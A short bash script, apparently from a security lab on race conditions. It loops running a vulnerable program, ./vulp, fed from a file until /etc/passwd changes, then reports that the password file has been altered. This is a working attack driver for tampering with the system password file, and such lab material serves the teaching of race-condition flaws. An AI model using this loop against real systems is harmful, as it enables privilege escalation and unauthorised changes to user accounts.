#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

while [ "$old" == "$new" ]  
do
  # echo "hello" | ./vulp 
  ./vulp < passwd_input  # ask vulp to get input from this file 
   new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"

